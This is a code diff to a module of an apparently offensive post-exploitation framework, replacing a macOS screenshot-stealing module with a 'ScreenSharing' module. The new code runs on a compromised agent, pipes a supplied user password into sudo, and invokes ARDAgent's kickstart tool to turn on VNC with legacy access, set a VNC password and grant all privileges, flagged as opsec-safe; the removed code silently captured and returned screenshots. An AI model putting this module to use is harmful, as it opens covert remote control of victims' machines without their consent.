@@ -1,3 +1,6 @@
+from lib.common import helpers
+
+
 class Module:
 
     def __init__(self, mainMenu, params=[]):
@@ -5,25 +8,25 @@ class Module:
         # metadata info about the module, not modified during runtime
         self.info = {
             # name for the module that will appear in module menus
-            'Name': 'Screenshot',
+            'Name': 'ScreenSharing',
 
             # list of one or more authors for the module
-            'Author': ['@harmj0y'],
+            'Author': ['@n00py'],
 
             # more verbose multi-line description of the module
-            'Description': ('Takes a screenshot of an OSX desktop using screencapture and returns the data.'),
+            'Description': ('Enables ScreenSharing to allow you to connect to the host via VNC.'),
 
             # True if the module needs to run in the background
-            'Background': False,
+            'Background' : False,
 
             # File extension to save the file as
-            'OutputExtension': "png",
+            'OutputExtension' : "",
 
             # if the module needs administrative privileges
-            'NeedsAdmin': False,
+            'NeedsAdmin' : False,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
-            'OpsecSafe': False,
+            'OpsecSafe' : True,
 
             # the module language
             'Language' : 'python',
@@ -32,23 +35,27 @@ class Module:
             'MinLanguageVersion' : '2.6',
 
             # list of any references/other comments
-            'Comments': []
+            'Comments': ['https://www.unix-ninja.com/p/Enabling_macOS_screen_sharing_VNC_via_command_line']
         }
 
         # any options needed by the module, settable during runtime
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
-            'Agent': {
-                # The 'Agent' option is the only one that MUST be in a module
+            'Agent' : {
                 'Description'   :   'Agent to execute module on.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'SavePath': {
-                'Description'   :   'Path of the temporary screenshot file to save.',
+            'Password' : {
+                'Description'   :   'User password for sudo.',
                 'Required'      :   True,
-                'Value'         :   '/tmp/out.png'
+                'Value'         :   ''
+            },
+            'VNCpass' : {
+                'Description'   :   'Password to use for VNC',
+                'Required'      :   True,
+                'Value'         :   ''
             }
         }
 
@@ -69,18 +76,11 @@ class Module:
 
     def generate(self):
 
-        savePath = self.options['SavePath']['Value']
 
-        script = """
-# take a screenshot using screencapture
-run_command('screencapture -x %s')
-# base64 up resulting file, delete the file, return the base64 of the png output
-#   mocked from the Empire screenshot module
-f = open('%s', 'rb')
-data = f.read()
-f.close()
-run_command('rm -f %s')
-print data
-""" % (savePath, savePath, savePath)
 
+        password = self.options['Password']['Value']
+        vncpass = self.options['VNCpass']['Value']
+
+        enable = "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -clientopts -setvnclegacy -vnclegacy yes -clientopts -setvncpw -vncpw %s -restart -agent -privs -all"  % (vncpass)
+        script = 'import subprocess; subprocess.Popen("echo \\"%s\\" | sudo -S %s", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)' % (password, enable)
         return script
